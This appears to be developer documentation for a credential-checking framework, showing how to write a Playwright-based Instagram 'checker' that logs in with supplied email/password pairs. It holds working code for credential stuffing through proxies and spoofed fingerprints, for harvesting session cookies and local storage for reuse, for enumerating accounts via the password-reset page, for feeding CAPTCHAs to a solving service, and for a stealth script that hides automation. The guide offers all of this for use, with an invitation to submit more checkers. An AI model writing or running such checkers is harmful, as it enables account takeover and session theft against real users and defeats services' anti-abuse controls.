# Creating Custom Checkers

Learn how to extend the framework with custom service checkers.

## Overview

A checker is a module that knows how to interact with a specific service (e.g., MEGA, Dropbox, Instagram) to verify credentials or extract data. Each checker must implement the `BaseChecker` interface.

## Basic Structure

Every checker must:
1. Inherit from `BaseChecker`
2. Implement `check_single()` method
3. Implement `is_account_exists()` method
4. Handle errors gracefully
5. Return standardized `CheckResult` objects

## Step-by-Step Guide

### 1. Create a New Checker File

```python
# checkers/social/instagram.py

from typing import Dict, Optional, Any
import asyncio
from playwright.async_api import async_playwright

from ..base import BaseChecker, CheckResult, CheckerResult
import logging

logger = logging.getLogger(__name__)


class InstagramChecker(BaseChecker):
    """
    Checker for Instagram accounts
    """
    
    LOGIN_URL = "https://www.instagram.com/accounts/login/"
    
    def __init__(self, config: Dict[str, Any] = None):
        super().__init__("instagram", config)
```

### 2. Implement check_single()

This is the core method that attempts to log in:

```python
    async def check_single(
        self,
        email: str,
        password: str,
        proxy: Optional[Any] = None,
        fingerprint: Optional[Any] = None
    ) -> CheckResult:
        """Check Instagram credentials"""
        
        start_time = asyncio.get_event_loop().time()
        
        try:
            async with async_playwright() as p:
                # Configure browser with proxy
                browser_config = {'headless': True}
                if proxy:
                    browser_config['proxy'] = {'server': proxy.get_url()}
                
                browser = await p.chromium.launch(**browser_config)
                
                # Apply fingerprint
                context_options = {}
                if fingerprint:
                    context_options = fingerprint.get_playwright_config(fingerprint)
                
                context = await browser.new_context(**context_options)
                page = await context.new_page()
                
                # Navigate to login
                await page.goto(self.LOGIN_URL, wait_until='networkidle')
                await asyncio.sleep(2)  # Let page settle
                
                # Fill credentials
                await page.fill('input[name="username"]', email)
                await page.fill('input[name="password"]', password)
                
                # Click login button
                await page.click('button[type="submit"]')
                
                # Wait for response
                await asyncio.sleep(3)
                
                # Check for success indicators
                if '/accounts/onetap/' in page.url or page.url == 'https://www.instagram.com/':
                    # Success!
                    cookies = await context.cookies()
                    await browser.close()
                    
                    response_time = (asyncio.get_event_loop().time() - start_time) * 1000
                    
                    return CheckResult(
                        status=CheckerResult.SUCCESS,
                        email=email,
                        password=password,
                        service=self.service_name,
                        message="Login successful",
                        session_data={'cookies': cookies},
                        response_time=response_time
                    )
                
                # Check for 2FA
                if await page.query_selector('input[name="verificationCode"]'):
                    await browser.close()
                    return CheckResult(
                        status=CheckerResult.MFA_REQUIRED,
                        email=email,
                        service=self.service_name,
                        message="2FA required"
                    )
                
                # Check for CAPTCHA
                if await page.query_selector('[aria-label*="captcha"]'):
                    await browser.close()
                    return CheckResult(
                        status=CheckerResult.CAPTCHA,
                        email=email,
                        service=self.service_name,
                        message="CAPTCHA detected"
                    )
                
                # Login failed
                await browser.close()
                response_time = (asyncio.get_event_loop().time() - start_time) * 1000
                
                return CheckResult(
                    status=CheckerResult.FAILURE,
                    email=email,
                    service=self.service_name,
                    message="Invalid credentials",
                    response_time=response_time
                )
                
        except Exception as e:
            logger.error(f"Instagram checker error: {e}", exc_info=True)
            return CheckResult(
                status=CheckerResult.ERROR,
                email=email,
                service=self.service_name,
                message=str(e)
            )
```

### 3. Implement is_account_exists()

Check if an account exists without logging in:

```python
    async def is_account_exists(
        self,
        email: str,
        proxy: Optional[Any] = None
    ) -> bool:
        """
        Check if Instagram account exists
        
        Instagram doesn't have a reliable public API for this,
        so we use the password reset page
        """
        
        try:
            async with async_playwright() as p:
                browser_config = {'headless': True}
                if proxy:
                    browser_config['proxy'] = {'server': proxy.get_url()}
                
                browser = await p.chromium.launch(**browser_config)
                page = await browser.new_page()
                
                # Go to password reset
                await page.goto('https://www.instagram.com/accounts/password/reset/')
                await asyncio.sleep(2)
                
                # Enter email
                await page.fill('input[name="cppEmailOrUsername"]', email)
                await page.click('button[type="submit"]')
                await asyncio.sleep(2)
                
                # Check response
                # Instagram shows different messages for existing vs non-existing accounts
                page_content = await page.content()
                
                await browser.close()
                
                # Account exists if we see confirmation message
                return 'link to reset' in page_content.lower() or 'email sent' in page_content.lower()
                
        except Exception as e:
            logger.error(f"Error checking account existence: {e}")
            return False
```

### 4. Register the Checker

Add your checker to the registry:

```python
# checkers/__init__.py

from .cloud_storage.mega import MegaChecker
from .social.instagram import InstagramChecker

CHECKER_REGISTRY = {
    'mega': MegaChecker,
    'instagram': InstagramChecker,
    # Add more checkers here
}

def get_checker(service_name: str, config: Dict[str, Any] = None):
    """Get a checker instance for a service"""
    checker_class = CHECKER_REGISTRY.get(service_name.lower())
    if not checker_class:
        raise ValueError(f"No checker found for service: {service_name}")
    return checker_class(config)
```

## Advanced Features

### Handling CAPTCHAs

Integrate with CAPTCHA solving services:

```python
async def _solve_captcha(self, page, captcha_type: str) -> bool:
    """Solve CAPTCHA if encountered"""
    
    if not self.captcha_solver:
        return False
    
    try:
        # Extract CAPTCHA site key
        site_key = await page.get_attribute('[data-sitekey]', 'data-sitekey')
        
        # Send to solver
        solution = await self.captcha_solver.solve_recaptcha(
            site_key=site_key,
            page_url=page.url
        )
        
        # Inject solution
        await page.evaluate(f"""
            document.getElementById('g-recaptcha-response').innerHTML = '{solution}';
        """)
        
        return True
        
    except Exception as e:
        logger.error(f"CAPTCHA solving failed: {e}")
        return False
```

### Session Extraction

Save cookies and tokens for persistent access:

```python
async def _extract_session(self, context) -> Dict[str, Any]:
    """Extract session data for reuse"""
    
    cookies = await context.cookies()
    storage = await context.storage_state()
    
    return {
        'cookies': cookies,
        'local_storage': storage.get('origins', []),
        'timestamp': datetime.utcnow().isoformat()
    }
```

### Stealth Mode

Avoid detection with advanced evasion:

```python
async def _apply_stealth(self, context):
    """Apply anti-detection measures"""
    
    stealth_script = """
    // Overwrite navigator.webdriver
    Object.defineProperty(navigator, 'webdriver', {
        get: () => undefined
    });
    
    // Remove automation signatures
    delete window.cdc_adoQpoasnfa76pfcZLmcfl_Array;
    delete window.cdc_adoQpoasnfa76pfcZLmcfl_Promise;
    delete window.cdc_adoQpoasnfa76pfcZLmcfl_Symbol;
    """
    
    await context.add_init_script(stealth_script)
```

## Testing Your Checker

Create unit tests:

```python
# tests/unit/test_instagram_checker.py

import pytest
from checkers.social.instagram import InstagramChecker

@pytest.mark.asyncio
async def test_instagram_check_valid():
    """Test with valid credentials"""
    checker = InstagramChecker()
    
    result = await checker.check_single(
        email="test@example.com",
        password="test123"
    )
    
    assert result.service == "instagram"
    # Add more assertions

@pytest.mark.asyncio
async def test_instagram_account_exists():
    """Test account existence check"""
    checker = InstagramChecker()
    
    exists = await checker.is_account_exists("test@example.com")
    
    assert isinstance(exists, bool)
```

## Best Practices

1. **Rate Limiting**: Always respect the service's rate limits
2. **Error Handling**: Catch and log all exceptions
3. **Stealth**: Use fingerprints and proxies
4. **Efficiency**: Close browsers and clean up resources
5. **Documentation**: Document service-specific quirks
6. **Testing**: Test with various scenarios

## Common Patterns

### Pattern 1: API-Based Checker

For services with public APIs:

```python
async def check_single(self, email, password, proxy=None, **kwargs):
    async with aiohttp.ClientSession() as session:
        async with session.post(
            'https://api.service.com/login',
            json={'email': email, 'password': password},
            proxy=proxy.get_url() if proxy else None
        ) as resp:
            if resp.status == 200:
                data = await resp.json()
                return CheckResult(
                    status=CheckerResult.SUCCESS,
                    email=email,
                    session_data=data
                )
            # Handle other cases...
```

### Pattern 2: Multi-Step Authentication

For complex flows:

```python
async def check_single(self, email, password, proxy=None, **kwargs):
    # Step 1: Get CSRF token
    csrf_token = await self._get_csrf_token()
    
    # Step 2: Submit credentials
    session_id = await self._submit_login(email, password, csrf_token)
    
    # Step 3: Verify success
    is_valid = await self._verify_session(session_id)
    
    # Return result...
```

## Troubleshooting

- **Timeouts**: Increase `page.wait_for_*()` timeout values
- **Element Not Found**: Use more robust selectors (data-testid, aria-labels)
- **Blocked Requests**: Ensure proxy is working correctly
- **Detection**: Apply more stealth techniques

## Next Steps

- Study existing checkers in `checkers/` directory
- Test your checker thoroughly
- Submit a PR to add it to the framework
- Document any service-specific requirements
